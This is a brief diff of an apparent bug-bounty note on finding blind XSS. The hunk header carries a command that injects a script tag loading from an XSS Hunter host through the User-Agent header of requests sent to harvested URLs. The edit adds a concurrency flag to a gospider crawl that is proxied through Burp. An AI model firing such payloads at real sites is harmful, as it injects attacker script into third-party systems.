@@ -103,7 +103,7 @@ cat roots.txt | waybackurls | httpx -H "User-Agent: \"><script src=$YOUR_XSS_HUN
 
 4- Now after set parameter in burp then we need send urls to out burp to check blind xss. 
 
-5- gospider -S hosts.txt -a -w --sitemap -r -d 8 -p http://127.0.0.1:8080 
+5- gospider -S hosts.txt -a -w --sitemap -r -c 100 -d 8 -p http://127.0.0.1:8080 
 
 **Same as SSRF**
 
